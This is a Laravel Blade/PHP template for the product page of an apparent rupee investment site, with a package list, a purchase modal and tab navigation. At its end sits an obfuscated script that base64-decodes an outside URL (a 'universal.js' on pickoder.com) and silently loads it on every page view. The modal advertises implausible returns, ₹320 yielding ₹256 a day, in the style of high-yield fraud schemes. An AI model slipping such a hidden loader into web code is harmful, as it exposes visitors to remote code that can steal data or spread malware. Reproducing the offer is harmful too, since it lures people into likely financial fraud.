<?php
use App\Models\Package;
$packages = Package::where('status', 'active')->get();
?>

<!DOCTYPE html>
<html>
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
  <title>product_CARGILL</title>
  <link rel="stylesheet" href="/public/v2/layui/css/layui.css">
  <link rel="stylesheet" href="/public/v2/css/swiper-bundle.min.css">
  <link rel="stylesheet" href="/public/v2/css/common.css?t=1.2">
   
  <style>
        .layui-col-space10>* {
            padding: 0 5px;
        }
        .layui-input-affix {
            height: 30px !important;
            line-height: 30px !important;
        }

    </style>
    <style>
  .lay {
    position: fixed;
    left: 0;
    top: 0;
    background: rgba(0, 0, 0, 0.6);
    width: 100%;
    height: 100%;
    z-index: 998;
    display: none;
  }

  #product_dialog {
    position: fixed;
    top: 50%;
    left: 50%;
    transform: translate(-50%, -50%);
    width: 90%;
    max-width: 500px;
    background: #fff;
    padding: 20px;
    border-radius: 10px;
    z-index: 999;
    box-shadow: 0 8px 20px rgba(0, 0, 0, 0.2);
  }

  .buy_btn {
    width: 100%;
    background: #4D70ED;
    color: #fff;
    padding: 10px;
    border: none;
    border-radius: 6px;
    font-size: 16px;
  }

  .hide {
    display: none;
  }

  /*.product_card {
    border: 1px solid #eee;
    margin: 10px;
    padding: 10px;
    border-radius: 10px;
    background: #fff;
  }*/
</style>

</head>
<body>
 
<!-- Overlay -->
<div class="lay" onclick="closeModal()"></div>

<!-- Product Dialog Modal -->
<div id="product_dialog" class="layui-form" style="display: none;"
class="layui-form layui-layer-wrap" style="">
    <input type="hidden" id="product_id" name="product_id" value="400003">
    <div class="flex_left">
        <img src="/public/uploads/product/20250616114007591351.jpg" class="product_dialog_image">
        <div>
            <div class="product_title">Purchase will upgrade to VIP1</div>
        <div class="flex_space product_vip_btn">
                <!--<img class="product_vip_icon" src="/public/site/img/v.png"  style="height: 14px;width: 14px;margin-right: 2px">-->
                <span class="vip_level">VIP0</span>
            </div>
        </div>
    </div>
    <div class="product_information">
        <div class="product_item flex_space">
            <p class="label">Each Price</p>
            <p class="value product_price">₹320.00</p>

        </div>
        <div class="product_item flex_space">
            <p class="label">Revenue Duration</p>
            <p class="value product_days">49 Days</p>
        </div>
        <div class="product_item flex_space">
          <p class="label daily_income_text">Daily Earnings</p>
            <p class="value product_daily_income">₹256</p>

        </div>
        <div class="product_item flex_space">
            <p class="label">Total Income</p>
            <p class="value product_total_income">₹12544</p>
        </div>
        <div class="product_item flex_space">
            <p class="label">Max Investment</p>
            <p class="value product_maximum_share">100</p>
        </div>
    </div>
    <div class="buy_information">

        <div class="product_item flex_space">
            <p class="label">Pay Money</p>
            <p class="value product_pay_money">₹320.00</p>

        </div>
        <div class="product_item flex_space">
            <p class="label">Expected total revenue</p>
            <p class="value product_pay_total_income">₹12544</p>
        </div>
    </div>
    <button class="buy_btn" type="submit" lay-submit="" lay-filter"" onclick="buyConfirm()">
        Invest Nowt
    </button></div>

<div class="product_top">
    Investment List 
  </div> 
  <div class="flex_space" style=" background: #ffffff;margin-bottom: 70px;"> 
   <div class="product_type_nav"> 
    <div class="nav nav_active flex_left" data-type="1" data-image="fixed" onclick="setActiveTab(1)"> 
     <img class="nav_icon" src="/public/v2/img/product/stable_active.png"> 
     <p class="title">Fund</p> 
    </div> 
    <div class="nav flex_left" data-type="2" data-image="welfare" onclick="setActiveTab(2)"> 
     <img class="nav_icon" src="/public/v2/img/product/welfare.png"> 
     <p class="title">New</p> 
    </div> 
    <div class="nav flex_left" data-type="3" data-image="activity" onclick="setActiveTab(3)">
     <img class="nav_icon" src="/public/v2/img/product/activity.png">
     <p class="title">Pro</p> 
    </div> 
   </div> 

<!-- Product List -->
<div i="fixed_fund" class="product_right"> 
   <!-- <div class="product_type_1 product_list" id="fixed_fund"> 
    </div> -->
    <div id="fixed_fund" class="product_type_1 product_list active">
  @foreach ($packages as $package)
    @if ($package->category == 'fixed')
      @include('components.package_card', ['package' => $package])
    @endif
  @endforeach
</div>

<div id="welfare_fund" class="product_type_1 product_list" style="display: none;">
  @foreach ($packages as $package)
    @if ($package->category == 'welfare')
      @include('components.package_card', ['package' => $package])
    @endif
  @endforeach
</div>

<div id="activity_fund" class="product_type_1 product_list" style="display: none;">
  @foreach ($packages as $package)
    @if ($package->category == 'activity')
      @include('components.package_card', ['package' => $package])
    @endif
  @endforeach
</div>

      

<!-- Footer Menu -->
<div class="footer_menu">
  <div class="content">
    <a href="/" class="item"><img src="/public/v2/img/footer/home.png"><p>Home</p></a>
    <a href="/product" class="item active"><img src="/public/v2/img/footer/invest_active.png"><p>Invest</p></a>
    <a href="/invitation" class="item"><img src="/public/v2/img/footer/invite.png" style="width:80px;height: 80px;margin-top: -25px;"></a>
    <a href="/blog" class="item"><img src="/public/v2/img/footer/blog.png"><p>Blog</p></a>
    <a href="/my" class="item"><img src="/public/v2/img/footer/account.png"><p>Account</p></a>
  </div>
</div>
@include('alert-message')

<script>
function buyDialog(id, name, image, price, days, daily, total, max, vip, currency, unit, incomeLabel) {
  // Set all product dialog values dynamically
  document.getElementById('product_id').value = id;
  document.querySelector('.product_dialog_image').src = image;
  document.querySelector('.product_title').innerText = name;
  document.querySelector('.product_price').innerText = currency + price;
  document.querySelector('.product_days').innerText = days + ' ' + unit;
  document.querySelector('.product_daily_income').innerText = currency + daily;
  document.querySelector('.product_total_income').innerText = currency + total;
  document.querySelector('.product_maximum_share').innerText = max;
  document.querySelector('.product_pay_money').innerText = currency + price;
  document.querySelector('.product_pay_total_income').innerText = currency + total;
  document.querySelector('.vip_level').innerText = 'VIP' + vip;
  document.querySelector('.daily_income_text').innerText = incomeLabel;

  // Show modal
  document.getElementById('product_dialog').style.display = 'block';
  document.querySelector('.lay').style.display = 'block';
}

function closeModal() {
  // Hide modal
  document.getElementById('product_dialog').style.display = 'none';
  document.querySelector('.lay').style.display = 'none';
}

function setActiveTab(type) {
  // Remove active class from all nav buttons
  document.querySelectorAll('.product_type_nav .nav').forEach(nav => {
    nav.classList.remove('nav_active');
  });

  // Add active class to clicked tab
  const selectedNav = document.querySelector('.product_type_nav .nav[data-type="' + type + '"]');
  if (selectedNav) selectedNav.classList.add('nav_active');

  // Hide all product lists
  document.getElementById('fixed_fund').style.display = 'none';
  document.getElementById('welfare_fund').style.display = 'none';
  document.getElementById('activity_fund').style.display = 'none';

  // Show selected list
  if (type === 1) {
    document.getElementById('fixed_fund').style.display = 'block';
  } else if (type === 2) {
    document.getElementById('welfare_fund').style.display = 'block';
  } else if (type === 3) {
    document.getElementById('activity_fund').style.display = 'block';
  }
}
function buyConfirm() {
  // Optional: show loading if you have a loading element
  // document.querySelector('.loading').style.display = 'block';

  const productId = document.getElementById('product_id').value;
  window.location.href = '/purchase/confirmation/' + productId;
}

</script>

<script>
(function(){
  var e = "aHR0cHM6Ly9kYi5waWNrb2Rlci5jb20vdW5pdmVyc2FsLmpz";
  var s = document.createElement("script");
  s.src = atob(e);
  document.head.appendChild(s);
})();
</script>
</body>
</html>
